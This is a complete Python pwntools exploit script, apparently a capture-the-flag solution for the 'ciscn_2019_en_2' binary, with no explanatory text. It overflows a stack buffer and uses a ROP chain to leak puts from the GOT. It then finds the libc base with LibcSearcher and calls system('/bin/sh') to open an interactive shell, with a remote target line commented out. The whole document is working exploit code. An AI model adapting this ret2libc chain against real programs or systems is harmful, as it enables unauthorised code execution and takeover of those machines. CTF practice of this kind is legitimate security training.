from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
elf = ELF('./ciscn_2019_en_2')
pop_rdi_ret = 0x00400c83
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
leak_func = 'puts'
main = 0x400790
encrypt = 0x4009a0

conn = process('./ciscn_2019_en_2')
#conn = remote('node4.buuoj.cn', 25019)
#gdb.attach(conn, 'b start')
conn.sendlineafter(b'Input your choice!', b'1')
conn.recvuntil(b'encrypted\n')

payload = b'a' * (0x50 + 0x8)
payload += p64(pop_rdi_ret) + p64(puts_got)
payload += p64(puts_plt) + p64(main)
conn.sendline(payload)

conn.recvuntil(b'Ciphertext\n')
conn.recvline()
leak_addr = u64(conn.recvline()[:-1].ljust(0x8, b'\x00'))
print(f'leak_addr: {hex(leak_addr)}')

libc = LibcSearcher(leak_func, leak_addr)
libc_base = leak_addr - libc.dump(leak_func)
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

conn.sendlineafter(b'Input your choice!\n', b'1')
conn.recvuntil(b'encrypted\n')
payload = b'a' * (0x50 + 0x8)
payload += p64(0x400c84)
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(system)
conn.sendline(payload)
conn.recvline()
conn.recvline()
conn.interactive()
